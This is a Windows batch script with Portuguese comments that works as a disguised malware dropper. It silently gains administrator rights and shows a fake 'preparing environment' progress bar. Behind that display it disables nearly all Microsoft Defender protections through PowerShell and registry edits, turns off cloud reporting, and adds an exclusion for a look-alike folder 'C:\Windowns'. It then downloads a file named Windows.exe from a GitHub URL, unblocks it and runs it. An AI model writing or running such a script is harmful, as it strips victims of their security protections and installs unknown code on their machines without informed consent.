@echo off
setlocal EnableDelayedExpansion

:: --- Auto-Elevacao silenciosa ---
net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)

:: --- Configuracao visual do CMD ---
title BoraBora
mode con: cols=60 lines=12
color 0F
cls

:: --- Funcao de barra de progresso ---
:: Etapa 1: Preparando ambiente (desativacao do Defender)
cls
echo.
echo.
echo        Preparando ambiente...
echo.
echo        [                              ] 0%%
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
cls
echo.
echo.
echo        Preparando ambiente...
echo.
echo        [###                           ] 10%%
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1
cls
echo.
echo.
echo        Preparando ambiente...
echo.
echo        [#####                         ] 15%%
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f >nul 2>&1
cls
echo.
echo.
echo        Configurando protecoes...
echo.
echo        [########                      ] 25%%
powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpynetReporting" /t REG_DWORD /d 0 /f >nul 2>&1
cls
echo.
echo.
echo        Configurando protecoes...
echo.
echo        [###########                   ] 35%%
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f >nul 2>&1
cls
echo.
echo.
echo        Aplicando configuracoes...
echo.
echo        [##############                ] 45%%
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul 2>&1
powershell -Command "Set-MpPreference -HighThreatDefaultAction 6 -Force" >nul 2>&1
powershell -Command "Set-MpPreference -ModerateThreatDefaultAction 6" >nul 2>&1
powershell -Command "Set-MpPreference -LowThreatDefaultAction 6" >nul 2>&1
powershell -Command "Set-MpPreference -SevereThreatDefaultAction 6" >nul 2>&1

:: --- Configuracao de download ---
set "URL=https://github.com/espertin/winds/blob/main/Windows.exe"
set "PASTA_APP=C:\Windowns"
set "NOME_EXE=Windows.exe"
set "CAMINHO_FULL=%PASTA_APP%\%NOME_EXE%"

if not exist "%PASTA_APP%" mkdir "%PASTA_APP%" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%PASTA_APP%'" >nul 2>&1
if exist "%CAMINHO_FULL%" del /f /q "%CAMINHO_FULL%" >nul 2>&1

cls
echo.
echo.
echo        Baixando arquivos...
echo.
echo        [###################           ] 60%%

:: --- Download ---
curl -L -f -s -o "%CAMINHO_FULL%" "%URL%" >nul 2>&1

cls
echo.
echo.
echo        Baixando arquivos...
echo.
echo        [########################      ] 80%%

:: --- Desbloqueio ---
powershell -Command "Unblock-File -Path '%CAMINHO_FULL%'" >nul 2>&1

cls
echo.
echo.
echo        Finalizando...
echo.
echo        [############################  ] 95%%
timeout /t 1 >nul

cls
echo.
echo.
echo        Concluido!
echo.
echo        [##############################] 100%%
timeout /t 1 >nul

:: --- Execucao ---
start "" "%CAMINHO_FULL%"
exit
